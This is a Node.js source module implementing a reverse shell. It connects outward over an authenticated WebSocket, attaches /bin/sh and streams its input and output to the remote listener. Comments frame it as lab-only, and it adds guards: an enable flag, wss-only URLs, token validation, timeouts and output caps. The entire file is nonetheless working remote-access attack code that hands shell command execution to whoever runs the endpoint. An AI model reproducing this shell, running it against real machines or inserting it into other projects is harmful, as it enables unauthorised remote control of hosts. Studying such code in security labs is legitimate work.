/** Explicit lab-only reverse shell. This module has no import-time side effects. */
import { spawn } from 'node:child_process';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import WebSocket from 'ws';
import { MAX_MESSAGE, MAX_OUTPUT, validateToken, parseMessage, decodeData } from './protocol.js';

function validateOptions({ enabled, url, token, timeoutMs, allowLoopback }) {
  if (enabled !== true) throw new Error('Explicitly enable the reverse-shell lab before running it');
  const address = new URL(url);
  const loopback = ['127.0.0.1', '[::1]'].includes(address.hostname);
  if (address.protocol !== 'wss:' && !(allowLoopback && loopback && address.protocol === 'ws:')) {
    throw new Error('A wss:// URL is required; plaintext is only allowed in local loopback tests');
  }
  if (address.username || address.password) throw new Error('URL credentials are not allowed');
  if (address.search || address.hash) throw new Error('URL query strings and fragments are not allowed');
  validateToken(token);
  if (!Number.isSafeInteger(timeoutMs) || timeoutMs < 1 || timeoutMs > 60000) {
    throw new TypeError('timeoutMs must be an integer between 1 and 60000');
  }
  if (process.platform === 'win32') throw new Error('The shell lab requires a POSIX operating system');
  return address;
}

/**
 * Connect outward, then attach /bin/sh to an authenticated WebSocket.
 * The endpoint can execute commands as the caller. Use a disposable lab machine.
 * This is a pipe-based shell, without a PTY or interactive terminal emulation.
 */
export async function runReverseShell({
  enabled = false, url, token, timeoutMs = 15000, allowLoopback = false, signal,
} = {}) {
  const address = validateOptions({ enabled, url, token, timeoutMs, allowLoopback });
  signal?.throwIfAborted();
  const directory = await mkdtemp(join(tmpdir(), 'taskflow-shell-'));
  try {
    return await new Promise((resolve, reject) => {
      const socket = new WebSocket(address, {
        headers: { Authorization: `Bearer ${token}` },
        handshakeTimeout: Math.min(timeoutMs, 5000),
        followRedirects: false,
        perMessageDeflate: false,
        maxPayload: MAX_MESSAGE,
      });
      let child;
      let childClosed = true;
      let socketClosed = false;
      let normalExit = false;
      let finished = false;
      let failure;
      let exitCode;
      let exitSignal;
      let killTimer;
      let bytes = 0;
      const stdout = [];
      const stderr = [];

      function killGroup(signalName) {
        if (!child?.pid) return;
        try { process.kill(-child.pid, signalName); }
        catch (error) { if (error.code !== 'ESRCH') failure ??= error; }
      }

      function maybeFinish() {
        if (finished || !socketClosed || !childClosed) return;
        finished = true;
        clearTimeout(timer);
        clearTimeout(killTimer);
        signal?.removeEventListener('abort', abort);
        killGroup('SIGKILL');
        if (failure) reject(failure);
        else resolve({
          stdout: Buffer.concat(stdout).toString(),
          stderr: Buffer.concat(stderr).toString(),
          code: exitCode,
          signal: exitSignal,
        });
      }

      function stop(error) {
        if (finished) return;
        failure ??= error;
        if (socket.readyState !== WebSocket.CLOSED) socket.terminate();
        killGroup('SIGTERM');
        if (!childClosed && !killTimer) {
          killTimer = setTimeout(() => killGroup('SIGKILL'), 250);
        }
        maybeFinish();
      }

      function send(message, callback) {
        if (socket.readyState !== WebSocket.OPEN) return;
        if (socket.bufferedAmount > MAX_OUTPUT) {
          stop(new Error('Shell output buffer limit exceeded'));
          return;
        }
        socket.send(JSON.stringify(message), (error) => {
          if (error) stop(error);
          else callback?.();
        });
      }

      function forward(type, chunk) {
        bytes += chunk.length;
        if (bytes > MAX_OUTPUT) {
          stop(new Error('Shell output limit exceeded'));
          return;
        }
        (type === 'stdout' ? stdout : stderr).push(chunk);
        // Base64 expands data, so split large pipe reads below the wire limit.
        for (let offset = 0; offset < chunk.length; offset += 16384) {
          send({ type, data: chunk.subarray(offset, offset + 16384).toString('base64') });
        }
      }

      const abort = () => stop(signal.reason);
      const timer = setTimeout(() => stop(new Error('Reverse-shell session timed out')), timeoutMs);
      signal?.addEventListener('abort', abort, { once: true });

      socket.on('error', stop);
      socket.on('close', () => {
        socketClosed = true;
        if (!normalExit && !failure) stop(new Error('Listener disconnected before shell exit'));
        maybeFinish();
      });
      socket.on('open', () => {
        if (failure) return;
        try {
          child = spawn('/bin/sh', [], {
            cwd: directory,
            env: { PATH: '/usr/bin:/bin', HOME: directory, TMPDIR: directory, LANG: 'C' },
            stdio: ['pipe', 'pipe', 'pipe'],
            detached: true,
          });
          childClosed = false;
          child.on('error', stop);
          child.on('spawn', () => send({ type: 'ready' }));
          child.stdin.on('error', (error) => {
            if (error.code !== 'EPIPE') stop(error);
          });
          child.stdout.on('data', (chunk) => forward('stdout', chunk));
          child.stderr.on('data', (chunk) => forward('stderr', chunk));
          // Kill any remaining descendants when the shell itself exits.
          child.on('exit', () => killGroup('SIGKILL'));
          child.on('close', (code, childSignal) => {
            childClosed = true;
            exitCode = code;
            exitSignal = childSignal;
            if (failure) { maybeFinish(); return; }
            normalExit = true;
            send({ type: 'exit', code, signal: childSignal }, () => socket.close(1000));
          });
        } catch (error) {
          stop(error);
        }
      });
      socket.on('message', (data) => {
        try {
          const message = parseMessage(data);
          if (message.type !== 'stdin' || !child || childClosed) {
            throw new Error('Unexpected shell protocol message');
          }
          if (child.stdin.writableLength > MAX_OUTPUT) throw new Error('Shell input buffer limit exceeded');
          child.stdin.write(decodeData(message));
        } catch (error) {
          stop(error);
        }
      });
      // Cancellation can occur while the temporary directory is being created.
      if (signal?.aborted) abort();
    });
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
}
